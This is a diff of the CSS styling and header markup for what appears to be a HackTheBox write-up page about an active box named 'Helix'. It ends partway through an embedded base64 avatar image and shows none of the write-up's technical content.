+  .code { font-family: var(--font-mono); font-size: .86em; background: var(--bg-inset); border: 1px solid var(--border-soft); padding: .08em .4em; border-radius: 5px; color: var(--ink); white-space: nowrap; }
 
-  @keyframes rise{from{opacity:0;transform:translateY(14px);}to{opacity:1;transform:none;}}
-  @keyframes blink{0%,50%{opacity:1;}50.01%,100%{opacity:0;}}
-  @media (prefers-reduced-motion:reduce){.hero-inner{animation:none;}h1.title .cursor{animation:none;}}
+  .term { background: var(--term-bg); border: 1px solid var(--border); border-radius: 11px; overflow: hidden; margin: 18px 0 22px; box-shadow: var(--shadow); }
+  .term-bar { display: flex; align-items: center; gap: 8px; padding: 10px 14px; border-bottom: 1px solid rgba(255,255,255,.06); background: rgba(255,255,255,.02); }
+  .term-bar .lamp { width: 11px; height: 11px; border-radius: 50%; background: #2c3644; }
+  .term-bar .lamp.a { background: #e05b5b; } .term-bar .lamp.b { background: #e0b24f; } .term-bar .lamp.c { background: #4faf6a; }
+  .term-bar .label { margin-left: 8px; font-family: var(--font-mono); font-size: .72rem; color: #6d7a8c; letter-spacing: .05em; }
+  .term-scroll { overflow-x: auto; }
+  pre.term-body { margin: 0; padding: 16px 18px; font-family: var(--font-mono); font-size: .84rem; line-height: 1.7; color: var(--term-ink); min-width: max-content; }
+  pre.term-body .c { color: #6b7787; }
+  pre.term-body .pr { color: #63cddb; }
+  pre.term-body .cmd { color: #e8eef6; }
+  pre.term-body .out { color: #8b98aa; }
+  pre.term-body .hi { color: #f4a94b; }
+  pre.term-body .win { color: #5fd68a; }
+  pre.term-body .no { color: #f7546a; }
+
+  .callout { border: 1px solid var(--border); border-left: 3px solid var(--accent); background: var(--bg-raised); border-radius: 10px; padding: 18px 20px; margin: 22px 0; }
+  .callout .k { font-family: var(--font-mono); font-size: .72rem; letter-spacing: .16em; text-transform: uppercase; color: var(--accent); display: block; margin-bottom: 8px; }
+  .callout p:last-child, .callout ul:last-child { margin-bottom: 0; }
+  .callout.cve { border-left-color: var(--crit); } .callout.cve .k { color: var(--crit); }
+  .callout.note { border-left-color: var(--signal); } .callout.note .k { color: var(--signal); }
+
+  .tbl-scroll { overflow-x: auto; margin: 18px 0 22px; }
+  table { border-collapse: collapse; font-family: var(--font-mono); font-size: .8rem; min-width: 100%; }
+  th, td { text-align: left; padding: 8px 14px; border-bottom: 1px solid var(--border-soft); white-space: nowrap; }
+  th { color: var(--ink-faint); font-weight: 500; text-transform: uppercase; letter-spacing: .08em; font-size: .7rem; border-bottom-color: var(--border); }
+  td.w { color: var(--accent); }
+  td.open { color: var(--ok); } td.shut { color: var(--ink-faint); }
+
+  .flags { display: grid; grid-template-columns: 1fr; gap: 14px; margin-top: 6px; }
+  @media (min-width: 600px) { .flags { grid-template-columns: 1fr 1fr; } }
+  .flag { background: var(--bg-raised); border: 1px solid var(--border); border-radius: 11px; padding: 18px 20px; display: flex; flex-direction: column; gap: 8px; }
+  .flag .name { font-family: var(--font-mono); font-size: .74rem; letter-spacing: .12em; text-transform: uppercase; color: var(--ink-faint); }
+  .flag .path { font-family: var(--font-mono); font-size: .82rem; color: var(--ink-dim); }
+  .flag .val { font-family: var(--font-mono); font-size: .9rem; letter-spacing: .14em; color: var(--ink); }
+  .flag.root { border-color: color-mix(in srgb, var(--accent) 40%, var(--border)); }
+  .flag.root .val { color: var(--accent); }
+  .flag .status { font-family: var(--font-mono); font-size: .72rem; color: var(--ok); display: inline-flex; align-items: center; gap: 6px; }
+  .flag .status::before { content: "●"; font-size: .7em; }
+
+  footer { padding: 44px 0 60px; color: var(--ink-faint); font-family: var(--font-mono); font-size: .78rem; }
+  footer .paths { display: flex; flex-direction: column; gap: 5px; margin-top: 14px; }
+
+  @keyframes rise { from { opacity: 0; transform: translateY(14px); } to { opacity: 1; transform: none; } }
+  @keyframes blink { 0%, 50% { opacity: 1; } 50.01%, 100% { opacity: 0; } }
+  @media (prefers-reduced-motion: reduce) { .hero-inner { animation: none; } h1.title .cursor { animation: none; } }
+  header.bar { border-bottom: 1px solid var(--border); background: var(--bg-inset); }
+  .bar-inner { display: flex; align-items: center; justify-content: space-between; height: 56px; gap: 16px; }
+  .brand { display: flex; align-items: center; gap: 11px; color: var(--ink); border: none; }
+  .brand:hover { border: none; }
+  .brand .mark { width: 30px; height: 30px; border-radius: 50%; overflow: hidden; background: var(--bg); border: 1.5px solid color-mix(in srgb, var(--accent) 32%, var(--border)); box-shadow: var(--shadow); flex: none; }
+  .brand .mark img { width: 100%; height: 100%; display: block; }
+  .brand b { font-family: var(--font-mono); font-weight: 700; font-size: 1rem; letter-spacing: -.01em; }
+  .bar .tagline { font-family: var(--font-mono); font-size: .76rem; color: var(--ink-faint); }
 </style>
 </head>
 <body>
 
-<header class="hero"><div class="wrap hero-inner">
-  <div class="crumb"><a href="../index.html">cd ..</a> &nbsp;/&nbsp; active boxes</div>
-  <div class="prompt-line mono"><span class="u">db-d2</span>@<span class="p">kali</span>:~$ ./pwn helix.htb</div>
-  <h1 class="title">Helix<span class="cursor" aria-hidden="true"></span></h1>
-  <p class="thesis">A <strong>Medium Linux ICS box</strong> — still active.</p>
-  <div class="meta-row"><span><b>platform</b> HackTheBox</span><span><b>difficulty</b> Medium · Linux</span><span><b>rooted</b> 24 Jul 2026</span><span><b>status</b> active</span></div>
+<header class="bar"><div class="wrap bar-inner">
+  <a class="brand" href="https://app.hackthebox.com/public/users/153734" title="db-d2 on HackTheBox"><span class="mark"><img src="data:image/png;base64,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